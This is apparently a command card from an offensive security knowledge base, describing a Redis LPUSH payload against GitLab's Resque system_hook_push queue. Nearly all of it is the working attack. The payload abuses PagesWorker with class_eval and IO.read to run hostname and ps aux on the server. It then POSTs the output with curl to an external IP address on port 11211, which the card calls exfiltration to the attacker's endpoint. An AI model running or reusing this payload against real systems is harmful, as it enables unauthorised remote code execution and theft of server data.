---
id: cmd-redis-lpush-pages
name: redis-lpush-pagesworker
type: command
executor: redis-cli
data: >-
  lpush resque:gitlab:queue:system_hook_push
  "{\"class\":\"PagesWorker\",\"args\":[\"class_eval\",\"IO.read('|(hostname; ps
  aux) | curl 51.75.74.52:11211 -X POST --data-binary @- ')\"],
  \"queue\":\"system_hook_push\"}"
output: Command output posted to attacker's curl endpoint
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:14.325Z'
platforms:
  - Linux
tags:
  - redis
  - rce
  - pagesworker
verified: false
validated: true
submitted: true
---

# redis-lpush-pagesworker

## Command

```bash
lpush resque:gitlab:queue:system_hook_push "{\"class\":\"PagesWorker\",\"args\":[\"class_eval\",\"IO.read('|(hostname; ps aux) | curl 51.75.74.52:11211 -X POST --data-binary @- ')\"], \"queue\":\"system_hook_push\"}"
```

## Description

Alternative gadget using PagesWorker for class_eval with IO.read piping output to curl POST for exfiltration.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| key | Queue key | Yes |
| value | JSON with PagesWorker args | Yes |

## Examples

### Basic Usage

As shown.

## Expected Output

Queue length integer, output received via curl on port 11211.

## Related

- [[procedures/Exploit-Redis-Injection-for-RCE]]
